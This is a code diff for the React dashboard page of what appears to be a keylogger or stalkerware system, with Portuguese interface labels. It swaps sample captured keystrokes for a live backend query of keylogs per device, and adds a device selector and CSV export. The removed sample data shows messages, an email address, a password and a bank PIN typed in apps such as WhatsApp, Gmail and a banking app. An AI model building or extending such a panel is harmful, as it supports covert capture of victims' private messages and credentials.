@@ -2,75 +2,16 @@ import { useState, useMemo } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card } from "@/components/ui/card";
-import { Download, Search, Filter, X } from "lucide-react";
+import { Download, Search, Filter, X, Loader2 } from "lucide-react";
+import { trpc } from "@/lib/trpc";
 
 interface Keylog {
   id: number;
-  deviceId: number;
+  deviceId: string;
   appName: string;
   keyText: string;
   createdAt: Date;
 }
-
-// Mock data - será substituído por dados reais do backend
-const MOCK_KEYLOGS: Keylog[] = [
-  {
-    id: 1,
-    deviceId: 1,
-    appName: "WhatsApp",
-    keyText: "Oi, tudo bem?",
-    createdAt: new Date(Date.now() - 1000 * 60 * 5),
-  },
-  {
-    id: 2,
-    deviceId: 1,
-    appName: "Gmail",
-    keyText: "usuario@email.com",
-    createdAt: new Date(Date.now() - 1000 * 60 * 10),
-  },
-  {
-    id: 3,
-    deviceId: 1,
-    appName: "WhatsApp",
-    keyText: "Sim, e você?",
-    createdAt: new Date(Date.now() - 1000 * 60 * 15),
-  },
-  {
-    id: 4,
-    deviceId: 1,
-    appName: "Instagram",
-    keyText: "Que foto legal!",
-    createdAt: new Date(Date.now() - 1000 * 60 * 20),
-  },
-  {
-    id: 5,
-    deviceId: 1,
-    appName: "Gmail",
-    keyText: "senha123",
-    createdAt: new Date(Date.now() - 1000 * 60 * 25),
-  },
-  {
-    id: 6,
-    deviceId: 2,
-    appName: "WhatsApp",
-    keyText: "Reunião amanhã?",
-    createdAt: new Date(Date.now() - 1000 * 60 * 30),
-  },
-  {
-    id: 7,
-    deviceId: 2,
-    appName: "Banco",
-    keyText: "1234",
-    createdAt: new Date(Date.now() - 1000 * 60 * 35),
-  },
-  {
-    id: 8,
-    deviceId: 2,
-    appName: "Chrome",
-    keyText: "www.google.com",
-    createdAt: new Date(Date.now() - 1000 * 60 * 40),
-  },
-];
 
 export default function Keylogs() {
   const [searchText, setSearchText] = useState("");
@@ -78,17 +19,23 @@ export default function Keylogs() {
   const [startDate, setStartDate] = useState("");
   const [endDate, setEndDate] = useState("");
   const [currentPage, setCurrentPage] = useState(1);
+  const [selectedDeviceId, setSelectedDeviceId] = useState("1");
   const itemsPerPage = 20;
+
+  // Buscar keylogs do backend
+  const { data: keylogs = [], isLoading, error } = trpc.keylogs.list.useQuery({
+    deviceId: selectedDeviceId,
+  }) as any;
 
   // Extrair apps únicos
   const uniqueApps = useMemo(
-    () => Array.from(new Set(MOCK_KEYLOGS.map((log) => log.appName))),
-    []
+    () => Array.from(new Set(keylogs.map((log) => log.appName))),
+    [keylogs]
   );
 
   // Filtrar keylogs
   const filteredKeylogs = useMemo(() => {
-    return MOCK_KEYLOGS.filter((log) => {
+    return keylogs.filter((log) => {
       // Filtro por texto
       if (
         searchText &&
@@ -115,7 +62,7 @@ export default function Keylogs() {
 
       return true;
     });
-  }, [searchText, selectedApp, startDate, endDate]);
+  }, [keylogs, searchText, selectedApp, startDate, endDate]);
 
   // Paginação
   const totalPages = Math.ceil(filteredKeylogs.length / itemsPerPage);
@@ -161,18 +108,37 @@ export default function Keylogs() {
         <div>
           <h1 className="text-3xl font-bold text-white">⌨️ Keylogs</h1>
           <p className="text-slate-400 mt-2">
-            Total: {filteredKeylogs.length} registros
+            Total: {isLoading ? "Carregando..." : String(filteredKeylogs.length)} registros
           </p>
         </div>
         <Button
           onClick={handleExportCSV}
-          disabled={filteredKeylogs.length === 0}
+          disabled={filteredKeylogs.length === 0 || isLoading}
           className="bg-cyan-600 hover:bg-cyan-700 text-white"
         >
           <Download className="w-4 h-4 mr-2" />
           Exportar CSV
         </Button>
       </div>
+
+      {/* Seletor de Dispositivo */}
+      <Card className="bg-slate-800 border-slate-700 p-4">
+        <label className="text-sm text-slate-400 mb-2 block">
+          Selecionar Dispositivo
+        </label>
+        <select
+          value={selectedDeviceId}
+          onChange={(e) => {
+            setSelectedDeviceId(e.target.value);
+            setCurrentPage(1);
+          }}
+          className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2 placeholder:text-slate-500"
+        >
+          <option value="1">Dispositivo 1</option>
+          <option value="2">Dispositivo 2</option>
+          <option value="3">Dispositivo 3</option>
+        </select>
+      </Card>
 
       {/* Filtros */}
       <Card className="bg-slate-800 border-slate-700 p-6">
@@ -274,14 +240,23 @@ export default function Keylogs() {
 
       {/* Lista de Keylogs */}
       <Card className="bg-slate-800 border-slate-700 p-6">
-        {paginatedKeylogs.length === 0 ? (
+        {isLoading ? (
+          <div className="flex items-center justify-center py-8">
+            <Loader2 className="w-6 h-6 text-cyan-400 animate-spin mr-2" />
+            <span className="text-slate-400">Carregando keylogs...</span>
+          </div>
+        ) : error && (error as any)?.message ? (
+          <p className="text-red-400 text-center py-8">
+            Erro ao carregar keylogs: {(error as any).message}
+          </p>
+        ) : paginatedKeylogs.length === 0 ? (
           <p className="text-slate-400 text-center py-8">
             Nenhum keylog encontrado com os filtros aplicados
           </p>
         ) : (
           <>
             <div className="space-y-2">
-              {paginatedKeylogs.map((log) => (
+              {paginatedKeylogs.map((log: Keylog) => (
                 <div
                   key={log.id}
                   className="flex items-start gap-4 p-4 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
